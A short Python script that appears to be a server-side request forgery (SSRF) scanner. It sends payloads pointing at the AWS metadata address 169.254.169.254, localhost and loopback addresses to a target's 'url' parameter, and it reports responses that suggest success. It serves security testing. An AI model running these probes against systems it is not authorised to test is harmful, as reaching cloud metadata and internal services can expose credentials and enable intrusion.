import requests

# Define SSRF payloads
ssrf_payloads = [
    'http://169.254.169.254/latest/meta-data/',  # AWS Metadata URL
    'http://169.254.169.254/',                   # AWS Metadata URL root
    'http://localhost/',                         # Localhost
    'http://127.0.0.1/',                         # Loopback
    'http://[::1]/',                             # IPv6 Loopback
    'http://example.com/',                       # External URL
]

# Target URL (Update this with your vulnerable application URL)
target_url = 'http://localhost/vulnerable_endpoint'

# Function to test SSRF
def test_ssrf(url, payloads):
    for payload in payloads:
        response = requests.get(url, params={'url': payload})
        
        # Check if the response indicates successful SSRF
        if "latest/meta-data" in response.text or \
           "EC2" in response.text or \
           "local" in response.text:
            print(f"[SSRF] Vulnerability found with payload: {payload}")
        else:
            print(f"[No Vulnerability] Tested payload: {payload}")

# Main function to run the SSRF tests
def main():
    print(f"Starting SSRF vulnerability scans on {target_url}...")
    test_ssrf(target_url, ssrf_payloads)
    print("SSRF vulnerability scans completed.")

if __name__ == "__main__":
    main()
